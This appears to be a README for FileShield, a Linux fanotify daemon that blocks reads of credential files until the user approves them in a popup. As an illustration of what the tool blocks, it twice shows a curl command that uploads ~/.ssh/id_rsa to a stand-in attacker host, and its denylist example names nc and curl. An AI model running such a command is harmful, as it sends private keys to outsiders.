# FileShield

**FileShield** is a Linux security tool that intercepts and blocks file access to sensitive files (e.g., AWS secrets, SSH keys, kubeconfig) before the read completes, then prompts the user to allow or deny it. It is built on **`fanotify` permission events** — the same kernel mechanism used by Linux antivirus scanners.

> Unlike approaches based on `inotify` or `auditd` alone, FileShield uses `FAN_OPEN_PERM` events which suspend the syscall in the kernel until a decision is made. The file data is never read by the requesting process until you click Allow.

---

## Features

- **True pre-access blocking**: The kernel suspends the `open()` syscall until FileShield responds — no race condition.
- **Interactive prompts**: Two-stage `kdialog` popups ask for permission before any data is exposed; the dialog inherits your session's Qt theme, fonts and scaling.
- **Scoped decisions**: _Allow Once_ is file-scoped with a `user_ttl`; _Allow Session_ lasts until you close the terminal; _Allow Always_ is a persistent per-file rule bound to the binary hash, call chain and exact command line. Matching deny scopes exist too.
- **SRE secrets covered by default**: AWS, kubeconfig, SSH keys, GCP, Azure, Vault token, Docker config, and more — out of the box.

---

## Requirements

- Linux kernel **5.0+** (5.1+ recommended)
- **`kdialog`** (for GUI popups; part of KDE but works in other desktop environments too)
- On non-KDE desktops, a Qt platform theme integration (e.g. `qgnomeplatform`/adwaita-qt for GNOME, `qt6ct`) if you want the dialog to match the system theme; without one kdialog falls back to Qt's default light theme

---

## Architecture

```text
Process syscall: open("/home/user/.aws/credentials", O_RDONLY)
        │
        ▼
  fanotify FAN_OPEN_PERM          ← kernel blocks syscall here
        │
        ▼
  fileshield daemon
  ├─ config denylist / session deny / runtime deny
  ├─ allow-once cache / session allow / runtime allow / config allowlist
  └─ no match → two-stage kdialog popup
        │
        ├─ Allow Once ───────────▶ FAN_ALLOW (cached for user_ttl)
        ├─ Allow  → Session ─────▶ FAN_ALLOW (until terminal closes)
        │         → Always ──────▶ FAN_ALLOW (+ runtime-allowlist.json)
        ├─ Deny   → Session ─────▶ FAN_DENY  (until terminal closes)
        │         → Always ──────▶ FAN_DENY  (+ runtime-denylist.json)
        └─ Deny ─────────────────▶ FAN_DENY  (this attempt only)
        │
  syscall resumes (or fails with EPERM)
```

---

## Installation

### 1. Install Dependencies

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install kdialog

# Fedora
sudo dnf install kdialog

# Arch
sudo pacman -S kdialog
```

### 2. Clone and Build

```bash
git clone https://github.com/yourusername/fileshield.git
cd fileshield
make
sudo make install
```

### 3. Start

```bash
sudo systemctl enable --now fileshield
```

The daemon requires root (`CAP_SYS_ADMIN`) to open a `fanotify` permission fd — this is a kernel requirement.

---

## Usage

Edit `fileshield.conf` to adjust protected paths or the allowlist, then reload:

```bash
sudo systemctl reload fileshield
# or equivalently:
sudo kill -HUP $(pidof fileshield)
```

Sending `SIGHUP` to the daemon causes it to re-read `fileshield.conf`, remove old fanotify marks, and re-register the new set. Persisted _Always Allow_ / _Always Deny_ lists are reloaded from disk at the same time, so edits to the state files (or the state files written by the dialogs themselves) take effect on reload. Session-scoped decisions live only in daemon memory: a config reload keeps them, a full daemon restart clears them (you are prompted again).

### Default Protected Paths

FileShield ships with the following paths protected out of the box:

```ini
[protected_paths]
# --- Cloud credentials ---
~/.aws/credentials
~/.aws/config
~/.azure/
~/.config/gcloud/

# --- Kubernetes ---
~/.kube/config
~/.kube/cache/

# --- SSH ---
~/.ssh/

# --- GPG / age / SOPS ---
~/.gnupg/
~/.config/sops/

# --- Password managers & vaults ---
~/.password-store/
~/.config/op/
~/.vault-token
~/.config/vault/

# --- Container registries ---
~/.docker/config.json
~/.config/helm/repositories.yaml

# --- Terraform ---
~/.terraform.d/credentials.tfrc.json
~/.terraformrc

# --- SCM tokens ---
~/.config/gh/hosts.yml

# --- General ---
~/.netrc
~/.env
```

Paths listed in `[protected_paths]` that do not exist yet are skipped at startup with a warning. They remain covered by the filesystem mount mark, so opening the file after it is created is still intercepted; run `sudo systemctl reload fileshield` (or `kill -HUP`) to add a direct mark. The daemon refuses to start only if no configured path on any filesystem could be marked at all.

### Allowlist

The `[allowlist]` section is **empty by default**. Pre-allowlisting a binary by path is risky: if that binary is replaced, wrapped, or symlinked by a compromised package, it inherits access without any popup.

Add entries only for tools you have audited and trust at that exact path:

```ini
[allowlist]
# Format: /absolute/path/to/binary = /path/to/target/file
# /usr/bin/ssh       = ~/.ssh/known_hosts
# /usr/bin/gpg       = ~/.gnupg/
```

- A **scoped** entry (`binary = target`) grants the binary access to that one target file or folder. Matching is _equal or under_: `/usr/bin/gpg = ~/.gnupg/` covers the directory and everything inside it; a bare file target covers exactly that file.
- A **bare** entry (binary alone, no `=`) is a **global rule**: the binary may access _every_ protected path. This is the most dangerous form — use it sparingly.
- A binary may appear on **multiple lines** with different targets when it needs exceptions for more than one file or folder.
- `~` in binary and target paths expands for every user's home, the same way `[protected_paths]` do.
- Rules no longer carry a per-entry TTL: repeated opens refresh the file cache for `user_ttl` seconds (see [Settings](#settings)).

> **Why not pre-allowlist common SRE tools?**  
> A supply-chain attack that replaces `/usr/local/bin/aws` would get unconditional access to `~/.aws/credentials` forever. An empty default forces a conscious opt-in decision per binary.

### Denylist

`[denylist]` uses the same format as `[allowlist]` but denies access:

```ini
[denylist]
# Format: /absolute/path/to/binary = /path/to/target/file
# /usr/bin/curl       = ~/.netrc
# /usr/bin/nc
```

A scoped entry denies the binary that one file or folder; a bare binary line is a global deny covering every protected path; the same binary may appear on multiple lines. **Denials are always evaluated first**: a config denylist hit produces `FAN_DENY` (the open fails with `EPERM`) before any allowlist, cache, or session rule is consulted, and no dialog is shown.

### Settings

```ini
[settings]
# How long an "Allow Once" decision is cached for the same process and file
# (seconds).  Config allowlist hits also refresh the cache with this TTL.
user_ttl = 300

# Cap for "Allow Session" / "Deny Session" decisions (seconds).
# 0 = the decision lives exactly as long as the shell session (session leader);
# a positive value additionally expires it after that many seconds.
session_ttl = 0

# Log the per-event debug details ([event]/[dedup]/[pump] plumbing) in
# addition to the one-line-per-access INFO record.  Off by default; the
# daemon's -d/--debug flag enables the same thing for a single run.
debug = no
```

### Example Workflow

When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:

1. The kernel suspends the `open()` call.
2. A two-stage popup appears. Stage 1:

   ```text
   Process curl (PID 4521, parent: bash (PID 4518)) wants to read:
   /home/user/.ssh/id_rsa

   Binary:   /tmp/curl
   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa

   • Allow Once — this file, for the configured user_ttl
   • Allow      — choose session or permanent access
   • Deny       — choose a session or permanent block
   ```

   Clicking **Allow** opens stage 2 (grants):

   ```text
   Allow access to:
   /home/user/.ssh/id_rsa

   • Allow Session — this file until this session closes
   • Allow Always  — this file permanently (re-prompts if the binary changes)
   • Cancel        — deny this time
   ```

   Clicking **Deny** opens the matching deny stage: _Deny Session / Deny Always / Deny_.

3. **Deny** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
4. **Allow Once** → `FAN_ALLOW` — access is granted and cached for this process and this exact file for `user_ttl` seconds.
5. **Allow Session** → `FAN_ALLOW` — any process of that binary in this shell session may read that one file until the terminal closes (or `session_ttl` elapses, whichever comes first).
6. **Allow Always** → `FAN_ALLOW` — a persistent, file- and command-scoped runtime allowlist entry is created (see below).

### Decision Scopes

| Choice        | Matches on                                                    | Lifetime                                                      | Persisted                |
| ------------- | ------------------------------------------------------------- | ------------------------------------------------------------- | ------------------------ |
| Allow Once    | PID + binary + exact file                                     | `user_ttl` seconds                                            | no                       |
| Allow Session | POSIX session + binary (+ SHA-512) + exact file               | until the shell/session leader exits, capped by `session_ttl` | no                       |
| Allow Always  | binary SHA-512 + call chain + exact file + exact command line | until removed                                                 | `runtime-allowlist.json` |
| Deny Session  | same key shape as Allow Session                               | same as Allow Session                                         | no                       |
| Deny Always   | same key shape as Allow Always                                | until removed                                                 | `runtime-denylist.json`  |
| Deny          | —                                                             | this attempt only                                             | no                       |

Denials are always checked before grants, so a config, session or permanent denial can never be bypassed by an allow rule or a cached _Allow Once_. The decision order is: config denylist → session deny → runtime deny → file cache → session allow → runtime allow → config allowlist → dialog. An open that reaches a protected inode through a path outside every protected prefix (a hard link) never takes a grant from those lists: it always shows the dialog, so an approval for the original path cannot silently cover the link.

`session_ttl` is configured in `[settings]` and defaults to `0`, meaning session decisions live exactly as long as the shell session itself. A non-zero value additionally expires them after that many seconds.

### Always Allow — runtime dynamic allowlist (persistent)

Clicking **Always Allow** stores a fingerprinted, file- and command-scoped entry in the daemon's in-memory allowlist **and persists it to disk** for reuse after daemon restart or reboot:

| Attribute checked on every future match       | Why                                                                                                                      |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Binary path                                   | Basic identity                                                                                                           |
| **SHA-512 of the binary**                     | Detects on-disk replacement (supply-chain attack)                                                                        |
| **Call chain** (up to 3 ancestors)            | Prevents a different caller from inheriting the rule                                                                     |
| **SHA-512 of each ancestor exe**              | Detects replaced parent binaries                                                                                         |
| **Target file**                               | Least privilege: approving `kubectl` for `~/.kube/config` does not grant `~/.ssh/id_rsa`                                 |
| **Command line** (stored, matched by SHA-512) | Only the exact invocation, arguments included, stays silent: `kubectl get pods` does not authorize `kubectl get secrets` |

**Example:** clicking _Always Allow_ for the popup shown above records:

```text
binary:         /usr/bin/curl     (sha512: a3f1…)
target:         /home/user/.ssh/id_rsa
command:        curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
parent[0]:      bash              (sha512: 7c82…)
parent[1]:      systemd           (sha512: 0d4e…)
```

A future `curl` call from `zsh` instead of `bash` will prompt again because the call chain differs. A trojaned `/usr/bin/curl` will also prompt again because its SHA-512 has changed. The same binary reading `~/.aws/credentials` prompts because the target differs, and invoking it with different arguments (e.g. `kubectl get pods` vs `kubectl get secrets`) prompts because the command line differs.

> The command line is stored verbatim in the root-only (0600) state file so entries can be reviewed, and a SHA-512 over the **full raw command line** (arguments and all, bounded at 64 KB) is the matching key — two invocations that share a long prefix do not collide. Arguments may therefore contain secrets (`-p…`, tokens); the state file is readable only by root, but treat it accordingly. State entries written by older versions without a `target_path` or a command line, and entries whose stored fingerprint predates full-line hashing, no longer match: the access is prompted again (fail closed), and choosing _Always_ records a fresh entry. Remove stale duplicates with `jq` as shown below.

#### Persistence

_Always Allow_ and _Always Deny_ entries are stored in JSON state files (`/var/lib/fileshield/runtime-allowlist.json` and `/var/lib/fileshield/runtime-denylist.json`) with strict permissions (mode 0600, root-only). The entries are:

- **Automatically loaded** when the daemon starts (on reboot, after systemctl restart, etc.)
- **Immediately saved** when you click "Always Allow" / "Deny Always" (no manual action needed)
- **Fail-secure**: if a state file is corrupted or unreadable, the daemon starts with an empty list and reprompts; entries missing a target file or a recorded command line are dropped

Each entry records the binary path and SHA-512, the target file, the exact command line (stored verbatim) together with its SHA-512 fingerprint, the ancestor call chain, and a creation timestamp:

```json
{
  "binary": "/usr/bin/kubectl",
  "binary_sha512": "a3f1…",
  "target_path": "/home/user/.kube/config",
  "cmdline": "kubectl config view --minify",
  "cmdline_sha512": "0123…",
  "chain_depth": 1,
  "chain_comm[0]": "zsh",
  "chain_sha512[0]": "7c82…",
  "created_at": 1700000000
}
```

To remove a single file-scoped entry, edit the state file directly (root-only, JSON array): delete the matching object with `jq`, or simply remove the file to clear the whole list.

```bash
# Remove every entry for one binary from the allowlist
sudo jq '.entries |= map(select(.binary != "/usr/bin/kubectl"))' \
    /var/lib/fileshield/runtime-allowlist.json > /tmp/ra.json \
    && sudo mv /tmp/ra.json /var/lib/fileshield/runtime-allowlist.json

# Clear all persisted entries
sudo rm /var/lib/fileshield/runtime-allowlist.json
sudo rm /var/lib/fileshield/runtime-denylist.json

sudo systemctl reload fileshield
```

To view the current persisted entries:

```bash
sudo cat /var/lib/fileshield/runtime-allowlist.json | jq .
sudo cat /var/lib/fileshield/runtime-denylist.json | jq .
```

---

## How It Works

1. The daemon calls `fanotify_init(FAN_CLASS_CONTENT, O_RDONLY | O_LARGEFILE)`.
2. It registers `FAN_OPEN_PERM` marks on each protected path via `fanotify_mark()`.
3. When a process opens a watched file, the kernel delivers a `fanotify_event_metadata` event and **blocks the calling process**.
4. The daemon resolves the binary path via `/proc/<pid>/exe` and evaluates the decision pipeline (config allowlist, session/permanent denials, file cache, session/permanent grants).
5. On a miss, it spawns a `kdialog` two-stage popup on the requesting user's desktop session and waits for user input. The session is detected per prompt and applied only in the dialog child (the daemon's own environment is never modified), so a prompt for one user's process cannot appear on another user's desktop.
6. It writes a `struct fanotify_response` with `FAN_ALLOW` or `FAN_DENY` back to the fanotify fd.
7. The kernel unblocks the original syscall with the appropriate result.

---

## Limitations

- **Root processes**: A process running as root can bypass fanotify. FileShield protects against unprivileged or compromised user-space processes.
- **GUI dependency**: Requires a desktop session for popups; on non-KDE desktops the popup matches the system theme only when a Qt platform theme integration is installed.
- **Kernel version**: `fanotify` permission events on directories require kernel 5.0+.
- **Networked filesystems**: `fanotify` marks do not propagate to NFS/CIFS mounts.
- **Bind mounts and `mmap`**: `fanotify` only reports events on the mount the mark was placed on, and does not report `mmap(2)` accesses. Bind-mount aliases of protected paths, or a process that already holds an open descriptor, are outside the threat model.
- **Hard links and symlinks**: Protected paths are canonicalized at load time, so a symlinked home or config directory is still matched, and files present when the daemon starts are tracked by inode. Opening one of those inodes through a path outside every protected prefix (a hard link) always prompts — allow rules are skipped for that open (see [Decision Scopes](#decision-scopes)). Files created after startup, files deeper than 8 directory levels under a protected path, and inodes past the table cap are not inode-tracked; tracking brand-new inodes via `FAN_CREATE` requires a `FAN_REPORT_FID` group and is a planned follow-up.
- **TOCTOU on binary identity**: The daemon resolves the calling process's binary via `/proc/<pid>/exe` while the process is kernel-suspended. The process cannot `execve()` at that moment, but its binary on disk could theoretically be replaced between the `readlink()` and the allowlist/cache check. This is an inherent limitation of all fanotify-based permission systems and is considered low-risk in practice.
- **Dialog rate limiting**: To bound prompt-flooding (e.g. a process that re-execs itself repeatedly), a binary path is denied without prompting after 20 prompts within 60 seconds, for a 30-second cooldown.
- **Command-line matching**: permanent _Always_ entries pin the exact command line, so tools whose arguments change every run (timestamps, random tokens, one-off URLs) will prompt on each invocation. Use _Allow Session_ or _Allow Once_ for those, or remove the persisted entry with `jq` (see [Persistence](#persistence)).

---

## Logs

FileShield writes all events to the system journal via `syslog(3)` under the `LOG_DAEMON` facility and the identifier `fileshield`.

### Log verbosity

By default FileShield logs **one line per access**: a rule hit logs which
list allowed/denied it (first access per TTL window — repeats inside the
window are silent), and a dialog access logs the prompt plus a
human-readable choice:

```text
dynamic allowlist hit: /usr/bin/md5sum (pid 108385) -> /home/micah/.kube/config
[dialog] asking user: pid=108783 binary=/usr/bin/cat target=/home/micah/.kube/config comm=cat
[dialog] user chose Allow Once for /usr/bin/cat (pid 108783) -> /home/micah/.kube/config
```

The per-event plumbing (`[event]`, `[dedup]`, `[pump]`, display-env
forwarding) is `LOG_DEBUG` and is suppressed by default. Enable it for
troubleshooting either with `debug = yes` in `[settings]` or with the
daemon's `-d/--debug` flag (also available via `--foreground` runs); both
survive a `SIGHUP` config reload for the settings key.

The daemon logs at the following levels:

| Level     | Events                                                                                                                   |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| `INFO`    | Start/stop, config load, fanotify marks added/removed, reload, one line per access (rule hits, prompts, user choices)     |
| `DEBUG`   | Per-event plumbing: raw event receipt, target resolution, dedup-cache reuse, pump decisions, dialog child lifecycle. Suppressed unless `debug = yes` in `[settings]` or `--debug` |
| `WARNING` | Failed marks (path not found), dialog timeout/failure, session detection unavailable, binary/command hashing unavailable, hard-link prompts |
| `ERR`     | `fanotify_init` failure, config parse error, fork/exec failure                                                           |

### Follow live events

```bash
# systemd journal (recommended)
journalctl -u fileshield -f

# or filter by syslog identifier across all units
journalctl -t fileshield -f
```

### Query past events

```bash
# Everything since last boot
journalctl -u fileshield -b

# Last 100 lines
journalctl -u fileshield -n 100

# Only errors and above
journalctl -u fileshield -p err

# Between two timestamps
journalctl -u fileshield --since "2026-05-26 09:00" --until "2026-05-26 10:00"
```

---

## Running in Foreground (Debug Mode)

To see all log output directly in the terminal without systemd, stop the service and run the daemon in the foreground:

```bash
sudo systemctl stop fileshield
sudo ./build/fileshield --foreground --config fileshield.conf
```

When stderr is attached to a terminal, `syslog` messages are also printed there (under systemd they appear once in the journal). Combine with `strace` for deep inspection:

```bash
sudo strace -e trace=fanotify_init,fanotify_mark,read,write \
    ./build/fileshield --foreground --config fileshield.conf
```

### AddressSanitizer / UBSan build

```bash
make debug
sudo ./build/fileshield --foreground --config fileshield.conf
```

This builds with `-O0 -g -fsanitize=address,undefined` and prints any memory errors or undefined behaviour to stderr immediately.

---

## Running Tests

Unit tests cover the cache, config parser, session decisions, JSON state files, SHA-512 digests, fanotify event handling, and utility functions. They require no root and no kernel fanotify support (the kernel saturation test self-skips without `CAP_SYS_ADMIN`).

```bash
# Build and run all tests
make test

# Build tests without running
make build/test_cache build/test_config build/test_session build/test_persist build/test_sha512 build/test_utils build/test_fanotify

# Run a single test binary directly
./build/test_cache
./build/test_config
./build/test_session
./build/test_persist
./build/test_sha512
./build/test_utils
./build/test_fanotify
```

A passing run prints `PASS` for each suite; failures print the failing assertion and exit non-zero.

### Static analysis

```bash
make lint
```

Runs `cppcheck` over all sources in `src/` and `tests/`. Requires `cppcheck` to be installed (`apt install cppcheck` / `dnf install cppcheck`).

### Benchmarks

```bash
make bench
```

Builds and runs `tests/bench_hotpath.c`, the microbenchmarks for the per-event hot path (allow cache, path matching, SHA-512 fingerprints, runtime-list matching, protected-inode lookups). Hot-path changes are kept only when the harness shows a win; before/after numbers are recorded in the commit message and in comments at the changed sites.

---

## Troubleshooting

- **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` is installed (`apt install kdialog` / `dnf install kdialog`). if kdialog is missing or fails, access is denied (fail closed).
- **Dialog does not match your theme?** The daemon runs as root with a bare environment, so FileShield forwards a whitelist of your session's appearance variables (`XDG_CURRENT_DESKTOP`, `KDE_FULL_SESSION`/`KDE_SESSION_VERSION`, `QT_QPA_PLATFORMTHEME`, `QT_STYLE_OVERRIDE`, scale factors, locale, cursor) into the dialog child after it drops to your user. On Plasma/KDE this makes kdialog use your color scheme and fonts automatically. On other desktops the dialog follows the system theme only if a Qt platform theme integration is installed (e.g. `qgnomeplatform`/adwaita-qt for GNOME, `qt6ct`); without one Qt falls back to its default light theme.
- **Dialog behavior on failure**: timeouts, exec failures and unexpected kdialog exit codes deny the access. On the stage-2 Allow dialog, `Allow Always` sits on the No button (kdialog exit code 1), which kdialog also returns for some runtime errors — this is a documented, accepted trade-off; _Allow Session_ remains available and exec failures/timeouts always fail closed.
- **Access blocked for a trusted process?** Add it to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
- **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
- **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
- **All accesses denied with no popup on a headless machine?** FileShield requires a live desktop session to display dialogs. On headless hosts the daemon will deny all unknown accesses (fail-closed). Run in foreground mode and inspect the stderr output to confirm.

---

## License

MIT License. See [LICENSE](LICENSE) for details.
